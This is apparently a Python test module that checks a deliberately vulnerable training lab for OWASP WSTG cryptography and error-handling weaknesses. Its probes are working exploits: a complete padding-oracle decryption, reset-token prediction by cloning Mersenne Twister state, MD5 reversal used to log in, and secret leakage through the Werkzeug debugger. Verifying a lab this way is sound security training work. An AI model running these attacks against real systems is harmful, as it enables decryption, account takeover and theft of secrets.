"""WSTG probes for machine 07 - Cryptography & Error Handling.

Each probe asserts that the intentional weakness is demonstrably present,
with real exploitation evidence (recovered plaintext, predicted tokens,
negotiated weak TLS, leaked traces) - not mere status codes.
"""
import base64
import datetime
import hashlib
import random
import re
import socket
import ssl
import urllib.parse

from labhttp import get, post, raw

ORACLE_SECRET = b"FLAG{cbc_oracle}"


def _hostport(url):
    p = urllib.parse.urlsplit(url)
    return p.hostname, p.port or (443 if p.scheme == "https" else 80)


# --- WSTG-CRYP-01: weak TLS ---------------------------------------------------

def _tls_probe(host, port, ciphers="ALL:@SECLEVEL=0", minv=None, maxv=None):
    """One handshake; returns (version, cipher_tuple, der_cert, response)."""
    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_ciphers(ciphers)
    if minv is not None:
        ctx.minimum_version = minv
    if maxv is not None:
        ctx.maximum_version = maxv
    s = socket.create_connection((host, port), timeout=8)
    try:
        w = ctx.wrap_socket(s, server_hostname=host)
        der = w.getpeercert(binary_form=True)
        info = (w.version(), w.cipher())
        w.sendall(b"GET / HTTP/1.0\r\nHost: weak-tls-lab\r\n\r\n")
        resp = w.recv(65536)
        w.close()
        return info[0], info[1], der, resp
    finally:
        s.close()


def cryp_01(ctx):
    from cryptography import x509

    host, port = _hostport(ctx.url("tls"))
    protos, ciphers_ok, der = {}, {}, None

    # (a) deprecated protocol versions
    for label, ver in [("TLSv1.0", ssl.TLSVersion.TLSv1),
                       ("TLSv1.1", ssl.TLSVersion.TLSv1_1),
                       ("TLSv1.2", ssl.TLSVersion.TLSv1_2)]:
        try:
            v, c, der, _ = _tls_probe(host, port, minv=ver, maxv=ver)
            protos[label] = f"{v}/{c[0]}"
        except (ssl.SSLError, OSError) as e:
            protos[label] = f"refused ({type(e).__name__})"

    # (b) weak cipher suites (cap at TLS1.2 so the TLS1.3 suites cannot mask
    # the result; RC4/3DES/NULL are compiled out of modern OpenSSL builds and
    # are attempted anyway to document what is and is not negotiable).
    for suite in ["RC4-SHA", "RC4-MD5", "DES-CBC3-SHA", "AES128-SHA",
                  "AES256-SHA", "NULL-SHA", "EXP-RC4-MD5"]:
        try:
            v, c, der, _ = _tls_probe(host, port, ciphers=suite + ":@SECLEVEL=0",
                                      minv=ssl.TLSVersion.TLSv1,
                                      maxv=ssl.TLSVersion.TLSv1_2)
            ciphers_ok[suite] = f"{v}/{c[0]}"
        except (ssl.SSLError, OSError):
            ciphers_ok[suite] = "not negotiable"

    deprecated = [k for k, v in protos.items()
                  if k in ("TLSv1.0", "TLSv1.1") and v.startswith("TLS")]
    weak = [k for k, v in ciphers_ok.items() if v.startswith("TLS")]

    # (c) certificate weaknesses
    cert_facts = {}
    if der:
        cert = x509.load_der_x509_certificate(der)
        now = datetime.datetime.now(datetime.timezone.utc)
        cn = cert.subject.get_attributes_for_oid(x509.oid.NameOID.COMMON_NAME)[0].value
        cert_facts = {
            "self_signed": cert.issuer == cert.subject,
            "expired": cert.not_valid_after_utc < now,
            "hostname_mismatch": cn != host,
            "weak_key": cert.public_key().key_size <= 1024,
            "sha1_sig": cert.signature_hash_algorithm.name == "sha1",
            "cn": cn,
            "key_bits": cert.public_key().key_size,
        }

    # (d) missing HSTS
    r = get(ctx.url("tls") + "/")
    no_hsts = r.header("strict-transport-security") is None

    ok = (bool(deprecated or weak)
          and all(cert_facts.get(k) for k in
                  ("self_signed", "expired", "hostname_mismatch", "weak_key", "sha1_sig"))
          and no_hsts)
    ev = (f"protos={protos}; weak_ciphers={ {k: v for k, v in ciphers_ok.items() if v.startswith('TLS')} }; "
          f"cert={cert_facts}; HSTS absent={no_hsts}")
    return ok, ev


# --- WSTG-CRYP-02: padding oracle (real byte-by-byte decryption) ---------------

def _oracle(ctx, blob):
    return post(ctx.url("/oracle/decrypt"), data={"ct": blob.hex()})


def cryp_02(ctx):
    blob = bytes.fromhex(get(ctx.url("/oracle/secret")).json()["ciphertext"])
    iv, c1 = blob[:16], blob[16:32]

    # Oracle distinguishability: corrupt ciphertext -> padding error;
    # original -> valid. This is the side channel the attack rides on.
    bad = bytearray(blob)
    bad[-1] ^= 0x01
    r_bad, r_good = _oracle(ctx, bytes(bad)), _oracle(ctx, blob)
    if not (r_bad.status == 500 and "Padding error" in r_bad.text
            and r_good.status == 200):
        return False, f"oracle not distinguishable: bad={r_bad.status} good={r_good.status}"

    inter = [0] * 16
    plain = bytearray(16)
    nreq = 2
    for k in range(15, -1, -1):
        pad = 16 - k
        found = None
        for g in range(256):
            forge = bytearray(16)
            for j in range(k + 1, 16):
                forge[j] = inter[j] ^ pad
            forge[k] = g
            r = _oracle(ctx, bytes(forge) + c1)
            nreq += 1
            if r.status != 500:  # padding accepted -> content check reached
                if pad == 1:
                    # rule out the natural-padding false positive
                    f2 = bytearray(forge)
                    f2[k - 1] ^= 0xFF
                    r2 = _oracle(ctx, bytes(f2) + c1)
                    nreq += 1
                    if r2.status == 500:
                        continue
                found = g
                break
        if found is None:
            return False, f"attack stalled at byte {k} after {nreq} requests"
        inter[k] = found ^ pad
        plain[k] = inter[k] ^ iv[k]

    n = plain[-1]
    recovered = bytes(plain[:-n]) if 1 <= n <= 16 else bytes(plain)
    ok = recovered == ORACLE_SECRET
    return ok, (f"padding-oracle decrypted vault token in {nreq} requests: "
                f"{recovered!r} (expected {ORACLE_SECRET!r})")


# --- WSTG-CRYP-03: sensitive data over unencrypted channels --------------------

def _read_until(sock, marker, limit=65536):
    buf = b""
    while marker not in buf and len(buf) < limit:
        chunk = sock.recv(4096)
        if not chunk:
            break
        buf += chunk
    return buf


def cryp_03(ctx):
    checks = {}

    # Login form posts credentials to a plain-HTTP action.
    home = get(ctx.url("/")).text
    checks["http_form_action"] = 'action="http://' in home

    # Capture the credential exchange and issued token from the wire (raw socket).
    body = "username=alice&password=Password123%21"
    req = (f"POST /login HTTP/1.1\r\nHost: 127.0.0.1:8700\r\n"
           f"Content-Type: application/x-www-form-urlencoded\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n{body}")
    wire = raw("127.0.0.1", 8700, req)
    head = wire.split(b"\r\n\r\n", 1)[0]
    checks["cleartext_login_token"] = b"200" in head and b"tok_live_" in wire
    checks["cookie_no_secure"] = (b"set-cookie" in head.lower()
                                  and b"secure" not in head.lower())

    # Basic-auth credentials + account secrets over plain HTTP.
    creds = base64.b64encode(b"alice:Password123!").decode()
    req2 = (f"GET /api/account HTTP/1.1\r\nHost: 127.0.0.1:8700\r\n"
            f"Authorization: Basic {creds}\r\nConnection: close\r\n\r\n")
    wire2 = raw("127.0.0.1", 8700, req2)
    checks["basic_auth_over_http"] = (b"account_number" in wire2
                                      and b"tok_live_" in wire2)

    # Non-TLS service: telnet-style console carries creds and a live token.
    thost, tport = _hostport("telnet://" + ctx.endpoints["telnet"]
                             if "://" not in ctx.endpoints["telnet"]
                             else ctx.endpoints["telnet"])
    s = socket.create_connection((thost, tport), timeout=10)
    try:
        _read_until(s, b"login:")
        s.sendall(b"alice\r\n")
        _read_until(s, b"Password:")
        s.sendall(b"Password123!\r\n")
        tail = _read_until(s, b"Last backup")
    finally:
        s.close()
    checks["telnet_cleartext_token"] = b"SECRET_TOKEN=tok_live_" in tail

    # TLS page submits to HTTP (mixed content) and sets a non-Secure cookie.
    r = get(ctx.url("tls") + "/")
    checks["mixed_content_form"] = 'action="http://' in r.text
    sc = r.header_all("set-cookie")
    checks["tls_cookie_no_secure"] = bool(sc) and not any(
        "secure" in v.lower() for v in sc)

    return all(checks.values()), str(checks)


# --- WSTG-CRYP-04: weak primitives ----------------------------------------------

def _untemper(y):
    y ^= y >> 18
    y ^= (y << 15) & 0xEFC60000
    x = y
    for _ in range(5):
        x = y ^ ((x << 7) & 0x9D2C5680)
    y = x
    x = y
    for _ in range(3):
        x = y ^ (x >> 11)
    return x & 0xFFFFFFFF


def cryp_04(ctx):
    from Crypto.Cipher import AES, ARC4, DES
    from Crypto.Util.Padding import unpad

    checks, recovered = {}, {}

    # 1. Unsalted MD5 hashes reversed with a precomputed lookup, then used.
    users = get(ctx.url("/users")).json()
    alice = next(u for u in users if u["name"] == "alice")
    words = ["Password123!", "Summer2024!", "password", "123456", "admin",
             "letmein", "qwerty", "alice123", "Welcome1"]
    table = {hashlib.md5(w.encode()).hexdigest(): w for w in words}
    pw = table.get(alice["pw_md5"])
    recovered["md5"] = pw
    checks["md5_reversed"] = pw is not None
    if pw:
        login = post(ctx.url("/login"),
                     data=urllib.parse.urlencode({"username": "alice", "password": pw}),
                     headers={"Content-Type": "application/x-www-form-urlencoded"})
        checks["md5_login_works"] = login.status == 200

    # Static keys "documented" for legacy partners.
    docs = get(ctx.url("/legacy/docs")).json()

    # 2. AES-ECB reveals plaintext structure (repeated blocks).
    ct = bytes.fromhex(get(ctx.url("/ecb/encrypt?data=" + "A" * 32 + "B" * 16))
                       .json()["ciphertext"])
    checks["ecb_structure"] = ct[:16] == ct[16:32] != ct[32:48]
    sec = bytes.fromhex(get(ctx.url("/ecb/secret")).json()["ciphertext"])
    pt = unpad(AES.new(docs["aes_ecb_key"].encode(), AES.MODE_ECB).decrypt(sec), 16)
    recovered["ecb"] = pt.decode()
    checks["ecb_secret_decrypted"] = pt == b"FLAG{ecb_mode}"

    # 3. DES with a static 56-bit key -> plaintext recovered.
    dsec = bytes.fromhex(get(ctx.url("/des/secret")).json()["ciphertext"])
    dpt = unpad(DES.new(docs["des_key"].encode(), DES.MODE_ECB).decrypt(dsec), 8)
    recovered["des"] = dpt.decode()
    checks["des_secret_decrypted"] = dpt == b"FLAG{des_legacy}"

    # 4. RC4 with a static key -> plaintext recovered.
    rsec = bytes.fromhex(get(ctx.url("/rc4/secret")).json()["ciphertext"])
    rpt = ARC4.new(docs["rc4_key"].encode()).decrypt(rsec)
    recovered["rc4"] = rpt.decode()
    checks["rc4_secret_decrypted"] = rpt == b"FLAG{rc4_legacy}"

    # 5. MT19937 reset tokens: clone state from 624 outputs, predict the next.
    toks = [get(ctx.url("/token")).json()["reset_token"] for _ in range(312)]
    outputs = [int(t[i:i + 8], 16) for t in toks for i in (0, 8)]
    clone = random.Random()
    clone.setstate((3, tuple(_untemper(y) for y in outputs) + (624,), None))
    predicted = "%08x%08x" % (clone.getrandbits(32), clone.getrandbits(32))
    actual = get(ctx.url("/token")).json()["reset_token"]
    checks["prng_next_token_predicted"] = predicted == actual
    recovered["prng"] = f"predicted={predicted} actual={actual}"

    return all(checks.values()), f"checks={checks}; recovered={recovered}"


# --- WSTG-ERRH-01: improper error handling ---------------------------------------

def errh_01(ctx):
    checks = {}

    found = get(ctx.url("/user?id=1"))
    missing = get(ctx.url("/user?id=99999"))
    injected = get(ctx.url("/user?id=1%27"))
    nonnum = get(ctx.url("/user?id=abc"))
    checks["enumerable_responses"] = (found.status == 200 and missing.status == 404
                                      and "alice" in found.text
                                      and "not found" in missing.text)
    checks["sql_schema_path_leak"] = (
        injected.status == 500
        and all(n in injected.text for n in
                ("SELECT", "users", "/app/lab.db", "sqlite3", "Traceback")))
    checks["debug_error_detail"] = nonnum.status == 500 and "no such column" in nonnum.text

    # Fail-open: transfer reports success while the operation actually failed.
    bal0 = get(ctx.url("/api/balance?user=alice")).json()["balance"]
    t1 = post(ctx.url("/api/transfer"),
              data={"from": "alice", "to": "ghost", "amount": 1000000})
    t2 = post(ctx.url("/api/transfer"),
              data={"from": "alice", "to": "bob", "amount": 99999999})
    bal1 = get(ctx.url("/api/balance?user=alice")).json()["balance"]
    bob1 = get(ctx.url("/api/balance?user=bob")).json()["balance"]
    ghost = get(ctx.url("/api/balance?user=ghost"))
    checks["fail_open_success_lie"] = (
        t1.status == 200 and t1.json().get("status") == "success"
        and t2.status == 200 and t2.json().get("status") == "success"
        and bal0 == bal1 and bob1 == 120.0 and ghost.status == 404)

    return all(checks.values()), str(checks)


# --- WSTG-ERRH-02: stack traces in two stacks -------------------------------------

def errh_02(ctx):
    checks = {}

    # Stack 1: Flask/Werkzeug with debug=True (interactive debugger exposed).
    f = get(ctx.url("/boom"))
    checks["flask_traceback"] = (
        f.status == 500
        and "Traceback (most recent call last)" in f.text
        and "/app/app.py" in f.text
        and re.search(r"line \d+", f.text) is not None
        and "RuntimeError" in f.text)
    checks["werkzeug_debugger"] = "debugger" in f.text.lower()
    checks["werkzeug_version"] = re.search(
        r"Werkzeug/[\d.]+", f.header("Server", "")) is not None

    # Local variables via the debugger's frame inspector (PIN protects only
    # the console; frame inspection is open). This is itself a finding.
    secret = re.search(r'SECRET\s*=\s*"([^"]+)"', f.text)
    frames = re.findall(r'frm=(\d+)', f.text) or re.findall(r'id="frame-(\d+)"', f.text)
    locals_ok = False
    if secret and frames:
        insp = get(ctx.url(f"/boom?__debugger__=yes&cmd=inspect&frm={frames[-1]}"
                           f"&s={secret.group(1)}"))
        locals_ok = "internal_signing_key" in insp.text
    checks["flask_local_vars_leak"] = locals_ok

    # Stack 2: Express (development mode) full stack traces.
    n = get(ctx.url("node") + "/crash")
    checks["node_traceback"] = (
        n.status == 500
        and "TypeError" in n.text
        and "/app/server.js:" in n.text
        and re.search(r"server\.js:\d+:\d+", n.text) is not None
        and "express/lib/router" in n.text)
    p = get(ctx.url("node") + "/parse?data=%7Bbroken")
    checks["node_second_trace"] = p.status == 500 and "SyntaxError" in p.text
    v = get(ctx.url("node") + "/debug/vars").json()
    checks["node_versions_leak"] = bool(v.get("versions", {}).get("node")) and bool(v.get("express"))

    return all(checks.values()), (
        f"checks={checks}; werkzeug_server={f.header('Server','')!r}; "
        f"node={v.get('versions',{}).get('node')} express={v.get('express')}")